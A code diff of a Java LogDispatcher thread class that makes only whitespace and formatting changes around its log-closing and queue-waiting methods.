@@ -183,6 +183,7 @@ public class LogDispatcher extends Thread implements Runnable {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " LogDispatcher closing"); //$NON-NLS-1$
 					}
+					
 					return;
 				}
 
@@ -294,6 +295,7 @@ public class LogDispatcher extends Thread implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Requested log not found"); //$NON-NLS-1$
 			}
+			
 			return false;
 		}
 
@@ -320,10 +322,12 @@ public class LogDispatcher extends Thread implements Runnable {
 
 		// Rename .tmp to .log
 		final Evidence evidence = evidences.get(p.getId());
+		
 		if (evidence != null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (closeLog): " + evidence);
 			}
+			
 			evidence.close();
 		} else {
 			if (Cfg.DEBUG) {
@@ -339,9 +343,8 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	public void waitOnEmptyQueue() {
 		try {
-						
 			synchronized (emptyQueue) {
-				if(queue.isEmpty()){
+				if (queue.isEmpty()) {
 					return;
 				}
 				
